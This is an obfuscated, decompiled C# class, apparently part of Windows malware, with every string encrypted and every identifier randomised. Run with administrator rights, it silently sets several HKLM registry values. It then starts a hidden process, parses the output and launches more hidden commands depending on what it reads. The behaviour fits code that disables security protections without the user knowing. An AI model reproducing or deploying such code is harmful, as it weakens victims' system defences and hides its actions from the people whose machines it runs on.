using System;
using System.Diagnostics;
using System.Security.Principal;
using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace UmXkJLRjSLdPF;

public static class iscBrmyfqxdoE
{
	[NonSerialized]
	internal static GetString getString_0;

	public static void ByfdYaOufjEH()
	{
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			bEwwXvaqjVCp(getString_0(107371574), getString_0(107371513), getString_0(107395776));
			bEwwXvaqjVCp(getString_0(107371520), getString_0(107371459), getString_0(107395729));
			bEwwXvaqjVCp(getString_0(107371434), getString_0(107370801), getString_0(107395729));
			bEwwXvaqjVCp(getString_0(107371434), getString_0(107370796), getString_0(107395729));
			bEwwXvaqjVCp(getString_0(107371434), getString_0(107370759), getString_0(107395729));
			MSVUFqgZKe();
		}
	}

	private static void bEwwXvaqjVCp(string string_0, string string_1, string string_2)
	{
		try
		{
			using RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(string_0, RegistryKeyPermissionCheck.ReadWriteSubTree);
			if (registryKey == null)
			{
				Registry.LocalMachine.CreateSubKey(string_0).SetValue(string_1, string_2, RegistryValueKind.DWord);
			}
			else if (registryKey.GetValue(string_1) != string_2)
			{
				registryKey.SetValue(string_1, string_2, RegistryValueKind.DWord);
			}
		}
		catch
		{
		}
	}

	private static void MSVUFqgZKe()
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = getString_0(107358084),
			Arguments = getString_0(107370722),
			UseShellExecute = false,
			RedirectStandardOutput = true,
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true
		};
		Process process2 = process;
		process2.Start();
		while (!process2.StandardOutput.EndOfStream)
		{
			string text = process2.StandardOutput.ReadLine();
			if (text.StartsWith(getString_0(107370685)) && text.EndsWith(getString_0(107371128)))
			{
				lVRdbeNioIpG(getString_0(107371119));
			}
			else if (text.StartsWith(getString_0(107370801)) && text.EndsWith(getString_0(107371128)))
			{
				lVRdbeNioIpG(getString_0(107371082));
			}
			else if (text.StartsWith(getString_0(107371013)) && text.EndsWith(getString_0(107371128)))
			{
				lVRdbeNioIpG(getString_0(107370980));
			}
			else if (text.StartsWith(getString_0(107370915)) && text.EndsWith(getString_0(107371128)))
			{
				lVRdbeNioIpG(getString_0(107370374));
			}
			else if (text.StartsWith(getString_0(107370313)) && text.EndsWith(getString_0(107371128)))
			{
				lVRdbeNioIpG(getString_0(107370256));
			}
			else if (text.StartsWith(getString_0(107370199)) && text.EndsWith(getString_0(107371128)))
			{
				lVRdbeNioIpG(getString_0(107370138));
			}
			else if (text.StartsWith(getString_0(107370589)) && text.EndsWith(getString_0(107371128)))
			{
				lVRdbeNioIpG(getString_0(107370524));
			}
			else if (text.StartsWith(getString_0(107370459)) && text.EndsWith(getString_0(107371128)))
			{
				lVRdbeNioIpG(getString_0(107370414));
			}
			else if (text.StartsWith(getString_0(107369857)) && text.EndsWith(getString_0(107371128)))
			{
				lVRdbeNioIpG(getString_0(107369828));
			}
			else if (text.StartsWith(getString_0(107369767)) && !text.EndsWith(getString_0(107396203)))
			{
				lVRdbeNioIpG(getString_0(107369738));
			}
			else if (text.StartsWith(getString_0(107369649)) && !text.EndsWith(getString_0(107395776)))
			{
				lVRdbeNioIpG(getString_0(107369628));
			}
			else if (text.StartsWith(getString_0(107370095)) && !text.EndsWith(getString_0(107370062)))
			{
				lVRdbeNioIpG(getString_0(107370089));
			}
			else if (text.StartsWith(getString_0(107370020)) && !text.EndsWith(getString_0(107370062)))
			{
				lVRdbeNioIpG(getString_0(107369983));
			}
			else if (text.StartsWith(getString_0(107369918)) && !text.EndsWith(getString_0(107370062)))
			{
				lVRdbeNioIpG(getString_0(107369885));
			}
			else if (text.StartsWith(getString_0(107369316)) && !text.EndsWith(getString_0(107370062)))
			{
				lVRdbeNioIpG(getString_0(107369279));
			}
		}
	}

	public static void lVRdbeNioIpG(string string_0)
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = getString_0(107358084),
			Arguments = string_0,
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true
		};
		Process process2 = process;
		process2.Start();
	}

	static iscBrmyfqxdoE()
	{
		Strings.CreateGetStringDelegate(typeof(iscBrmyfqxdoE));
	}
}
